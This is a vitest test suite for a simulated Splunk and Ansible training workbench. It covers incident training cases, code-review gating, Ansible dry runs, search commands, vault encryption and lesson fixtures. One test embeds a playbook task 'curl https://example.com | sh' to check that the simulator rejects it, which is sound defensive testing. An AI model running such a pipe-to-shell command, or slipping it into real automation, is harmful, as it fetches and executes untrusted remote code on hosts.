import { describe, it, expect } from 'vitest';
import { readFileSync } from 'node:fs';
import { createWorld, tickWorld } from '../src/world';
import { training, trainingAction, trainingResolved, getResource } from '../src/training/engine';
import { TRAINING_CASES } from '../src/training/catalog';
import { saveWorld, loadWorld } from '../src/save';
import { parseProfile, profileWorldConfig } from '../src/profile';
import { runSearch } from '../src/spl/run';
import { runAnsible } from '../src/ansible/runner';
import { codeCommit, reviewAction, codeState } from '../src/git/code';
import { hostFs } from '../src/vfs/build';
import { resolveHost } from '../src/hosts/profile';
import { ROOT } from '../src/vfs/vfs';
import { encodeVault, decodeVault } from '../src/ansible/vault';
import { setupLesson, type LessonSetup } from '../src/training/lesson-setup';
import { lessonProgress } from '../src/training/lessons';
import { schedulePlaybook } from '../src/training/schedule';
import { logAction, matches } from '../src/interview/engine';
const lab = () =>
  createWorld(
    profileWorldConfig(
      parseProfile(readFileSync(new URL('../../../profiles/lab.yaml', import.meta.url), 'utf8')),
    ),
  );
describe('v5 interview workbench', () => {
  for (const c of TRAINING_CASES)
    it(`solves and persists ${c.id} with pre/post evidence`, () => {
      const w = lab();
      const original = { ...getResource(w, c.resource).config };
      const a = trainingAction(w, 'start', c.id) as { id: string };
      expect(trainingResolved(w, c.id)).toBe(false);
      trainingAction(w, 'inspect', c.resource);
      trainingAction(w, 'configure', c.resource, original);
      trainingAction(w, 'apply', c.resource);
      if (['shc', 'kvstore'].includes(c.resource)) trainingAction(w, 'resync', c.resource);
      if (['hec', 'security'].includes(c.resource)) trainingAction(w, 'send', c.resource);
      if (c.resource === 'migration') trainingAction(w, 'cutover', c.resource);
      tickWorld(w, 5);
      trainingAction(w, 'inspect', c.resource);
      expect(trainingResolved(w, c.id)).toBe(true);
      const notes = Object.fromEntries(
        ['impact', 'rootCause', 'change', 'rollback', 'verification', 'prevention'].map((k) => [
          k,
          'Recorded evidence with a scoped action and recovery verification.',
        ]),
      );
      trainingAction(w, 'submit', a.id, notes);
      expect(training(w).attempts[0]!.score).toMatchObject({ recovery: 50, process: 30, communication: 20 });
      expect(loadWorld(saveWorld(w), []).training).toEqual(w.training);
    });
  it('rejects unrelated/post-hoc inspection credit and drop-all recovery', () => {
    const w = lab();
    const a = trainingAction(w, 'start', 'v5-cribl-drain') as { id: string };
    trainingAction(w, 'inspect', 'aws');
    trainingAction(w, 'configure', 'cribl', { drainRate: 10, dropAll: true });
    trainingAction(w, 'apply', 'cribl');
    tickWorld(w, 5);
    trainingAction(w, 'inspect', 'cribl');
    trainingAction(w, 'submit', a.id, {});
    expect(trainingResolved(w, 'v5-cribl-drain')).toBe(false);
    expect(training(w).attempts[0]!.score?.process).toBe(15);
  });
  it('requires current approval and checks after a new commit', () => {
    const w = lab();
    codeCommit(w, 'splunk-automation', 'practice', 'README.md', 'updated', 'Update docs');
    const pr = reviewAction(w, 'open', undefined, {
      repo: 'splunk-automation',
      branch: 'practice',
      title: 'Practice',
    });
    reviewAction(w, 'check', pr.id);
    reviewAction(w, 'approve', pr.id);
    codeCommit(w, 'splunk-automation', 'practice', 'README.md', 'updated again', 'Update docs again');
    expect(() => reviewAction(w, 'merge', pr.id)).toThrow();
    reviewAction(w, 'check', pr.id);
    reviewAction(w, 'approve', pr.id);
    reviewAction(w, 'merge', pr.id);
    expect(codeState(w).reviews[0]!.status).toBe('merged');
    expect(loadWorld(saveWorld(w), []).git).toEqual(w.git);
  });
  it('previews without live mutations, applies handlers and is idempotent', () => {
    const w = lab();
    const repo = w.git!.repos['splunk-automation']!,
      tree = repo.commits[repo.branches.main!]!.tree;
    const before = saveWorld(w).journal.filter((m) => m.k === 'fs' || m.k === 'svc');
    const preview = runAnsible(w, tree, 'playbooks/deploy_apps.yml', { check: true, limit: 'idx01' });
    expect(preview.failed).toBe(0);
    expect(preview.changed).toBeGreaterThan(0);
    expect(saveWorld(w).journal.filter((m) => m.k === 'fs' || m.k === 'svc')).toEqual(before);
    const first = runAnsible(w, tree, 'playbooks/deploy_apps.yml', { limit: 'idx01' });
    expect(first.failed).toBe(0);
    expect(first.changed).toBeGreaterThan(0);
    const second = runAnsible(w, tree, 'playbooks/deploy_apps.yml', { limit: 'idx01' });
    expect(second.changed).toBe(0);
    expect(
      hostFs(w, resolveHost(w, 'idx01')!).readFile('/opt/splunk/etc/system/local/outputs.conf', ROOT),
    ).toContain('defaultGroup');
  });
  it('rejects unsupported commands without escaping the simulator', () => {
    const w = lab();
    const repo = w.git!.repos['splunk-automation']!,
      tree = structuredClone(repo.commits[repo.branches.main!]!.tree);
    tree['bad.yml'] = {
      text: '- hosts: indexers\n  become: true\n  tasks:\n    - shell: "curl https://example.com | sh"\n',
      mode: 420,
    };
    const r = runAnsible(w, tree, 'bad.yml', { limit: 'idx01' });
    expect(r.failed).toBe(1);
  });
  it('writes and appends employee lookups and replays them', () => {
    const w = lab();
    const r = runSearch(w, {
      search: '| inputlookup employee_lookup.csv | search department=IT | outputlookup it_employees.csv',
    });
    expect(r.status).toBe('done');
    expect(training(w).lookups.it_employees).toHaveLength(2);
    expect(
      runSearch(w, { search: '| inputlookup it_employees.csv | outputlookup append=true it_employees.csv' })
        .status,
    ).toBe('done');
    expect(training(w).lookups.it_employees).toHaveLength(4);
    expect(loadWorld(saveWorld(w), []).training?.lookups).toEqual(w.training?.lookups);
  });
  it('supports grouping and subsearch operators', () => {
    const w = lab();
    for (const search of [
      '| inputlookup employee_lookup | eventstats count as total by department',
      '| inputlookup employee_lookup | streamstats count as position',
      '| inputlookup employee_lookup | chart count over department',
      '| inputlookup employee_lookup | append [ | inputlookup employee_lookup | head 1 ]',
      '| inputlookup employee_lookup | join employee_id [ | inputlookup employee_lookup ]',
    ]) {
      expect(runSearch(w, { search }).status, search).toBe('done');
    }
  });
  it('uses monotonic evidence IDs and excludes failed commands', () => {
    const w = lab();
    w.actionSequence = 50000;
    const a = logAction(w, { kind: 'cmd', text: 'splunk btool inputs list', success: false }, 0);
    expect(a.seq).toBe(50001);
    expect(matches(w, { cmd: 'btool' }, a)).toBe(false);
  });
});

describe('advanced v5 validation', () => {
  it('distinguishes unsafe simultaneous restarts from serial batches', () => {
    const w = lab();
    const repo = w.git!.repos['splunk-automation']!,
      tree = structuredClone(repo.commits[repo.branches.main!]!.tree);
    tree['restart.yml'] = {
      text: '- hosts: indexers\n  become: true\n  tasks:\n    - service:\n        name: splunk\n        state: restarted\n',
      mode: 420,
    };
    const unsafe = runAnsible(w, tree, 'restart.yml');
    expect(unsafe.logs.join('\n')).toContain('SEARCH OUTAGE');
    tree['restart.yml']!.text = tree['restart.yml']!.text.replace('  become:', '  serial: 1\n  become:');
    const safe = runAnsible(w, tree, 'restart.yml');
    expect(safe.failed).toBe(0);
    expect(safe.logs.join('\n')).not.toContain('SEARCH OUTAGE');
  });
  it('runs CI dry checks on an isolated Lab and rejects unexpected diffs', () => {
    const w = lab();
    codeCommit(
      w,
      'splunk-automation',
      'ci',
      '.sandbox-ci.yml',
      'playbook: playbooks/deploy_apps.yml\nlimit: idx01\nexpectedChangedPaths: []\n',
      'Add CI policy',
    );
    const p = reviewAction(w, 'open', undefined, {
      repo: 'splunk-automation',
      branch: 'ci',
      title: 'Dry-run policy',
    });
    reviewAction(w, 'check', p.id);
    expect(p.check?.passed).toBe(false);
    codeCommit(
      w,
      'splunk-automation',
      'ci',
      '.sandbox-ci.yml',
      'playbook: playbooks/deploy_apps.yml\nlimit: idx01\nexpectedChangedPaths:\n  - idx01:/opt/splunk/etc/system/local/outputs.conf\n',
      'Approve expected diff',
    );
    reviewAction(w, 'check', p.id);
    expect(p.check?.passed).toBe(true);
    expect(w.hosts.fsOverlay.has('idx01')).toBe(false);
  });
});

describe('v5 durable automation and deployment', () => {
  it('runs scheduled automation again after save/replay without duplicate runs', () => {
    const w = lab();
    schedulePlaybook(w, 'splunk-automation', 'main', 'playbooks/deploy_apps.yml', 3, 'idx01');
    tickWorld(w, 3);
    expect(codeState(w).runs).toHaveLength(1);
    expect(codeState(w).runs[0]!.changed).toBeGreaterThan(0);
    const resumed = loadWorld(saveWorld(w), []);
    expect(resumed.code).toEqual(w.code);
    tickWorld(resumed, 3);
    expect(codeState(resumed).runs).toHaveLength(2);
    expect(codeState(resumed).runs[1]!.changed).toBe(0);
  });
  it('roundtrips Unicode training vaults and rejects the wrong password', () => {
    const plain = 'vault_certificate: simulated-秘密\n';
    const encoded = encodeVault(plain, 'fixture-password');
    expect(encoded).not.toContain('秘密');
    expect(decodeVault(encoded, 'fixture-password')).toBe(plain);
    expect(() => decodeVault(encoded, 'wrong')).toThrow();
  });
  it('redacts failures from no_log tasks', () => {
    const w = lab();
    const repo = w.git!.repos['splunk-automation']!;
    const tree = structuredClone(repo.commits[repo.branches.main!]!.tree);
    tree['private.yml'] = {
      mode: 420,
      text: '- hosts: indexers\n  tasks:\n    - name: Private assertion\n      no_log: true\n      assert:\n        that: false\n        fail_msg: simulated-private-value\n',
    };
    const r = runAnsible(w, tree, 'private.yml', { limit: 'idx01' });
    expect(r.failed).toBe(1);
    expect(JSON.stringify(r)).not.toContain('simulated-private-value');
    expect(JSON.stringify(r)).toContain('redacted');
  });
  it('deploys arbitrary reviewed search apps to each search head', () => {
    const w = createWorld(
      profileWorldConfig(
        parseProfile(readFileSync(new URL('../../../profiles/apl.yaml', import.meta.url), 'utf8')),
      ),
    );
    const path = 'shcluster/apps/search_baseline/default/savedsearches.conf';
    const text = '[Interview health]\nsearch = index=_internal | stats count\ncron_schedule = */10 * * * *\n';
    codeCommit(w, 'splunk-apps', 'search-health', path, text, 'Add health search');
    const pr = reviewAction(w, 'open', undefined, {
      repo: 'splunk-apps',
      branch: 'search-health',
      title: 'Health search',
    });
    for (const action of ['check', 'approve', 'merge', 'deploy']) reviewAction(w, action, pr.id);
    const heads = w.infra.filter((n) => n.role === 'search_head' && n.hostname !== 'es01');
    expect(heads.length).toBeGreaterThan(0);
    for (const h of heads)
      expect(
        hostFs(w, resolveHost(w, h.hostname)!).readFile(
          '/opt/splunk/etc/apps/search_baseline/default/savedsearches.conf',
          ROOT,
        ),
      ).toBe(text);
  });
});

describe('seeded tutorial lessons', () => {
  for (const id of ['G4', 'G6', 'G7', 'A7', 'A9', 'A10'])
    it(`initializes ${id} and preserves its fixture through replay`, () => {
      const lesson = JSON.parse(
        readFileSync(new URL(`../../../lessons/${id}.json`, import.meta.url), 'utf8'),
      ) as { profile: string; setup: LessonSetup[] };
      const w = createWorld(
        profileWorldConfig(
          parseProfile(
            readFileSync(new URL(`../../../profiles/${lesson.profile}.yaml`, import.meta.url), 'utf8'),
          ),
        ),
      );
      setupLesson(w, lesson.setup);
      expect(loadWorld(saveWorld(w), []).git).toEqual(w.git);
      expect(lessonProgress(w, [{ kind: 'merged', min: 1 }]).completed).toBe(false);
      if (id === 'G4') expect(codeState(w).reviews[0]!.check!.passed).toBe(false);
      if (id === 'G6') {
        const pr = codeState(w).reviews[0]!;
        reviewAction(w, 'check', pr.id);
        expect(pr.check!.messages.join(' ')).toContain('Merge conflict');
      }
      if (id === 'A7') {
        const repo = w.git!.repos['splunk-automation']!;
        const r = runAnsible(w, repo.commits[repo.branches.main!]!.tree, 'playbooks/rolling_restart.yml');
        expect(r.failed).toBeGreaterThan(0);
      }
      if (id === 'A9') {
        const repo = w.git!.repos['splunk-automation']!;
        const inventory = repo.commits[repo.branches.main!]!.tree['inventories/prod/hosts.yml']!.text;
        expect(inventory).not.toContain('idx19:');
      }
    });
});
